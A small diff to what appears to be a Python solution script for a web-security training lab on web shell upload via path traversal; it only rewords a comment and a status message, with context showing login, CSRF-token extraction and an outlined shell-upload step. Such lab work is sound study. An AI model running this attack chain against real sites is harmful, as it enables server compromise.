@@ -7,7 +7,7 @@
 # Lab: Web shell upload via path traversal
 #
 # Steps: 1. fetch the login page
-#        2. Extract csrf token and session cookie
+#        2. Extract the csrf token and session cookie
 #        3. Login as wiener
 #        4. Fetch wiener profile
 #        5. Upload the shell file via path traversal
@@ -48,7 +48,7 @@ session = get_login.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # set credentials
 data = {
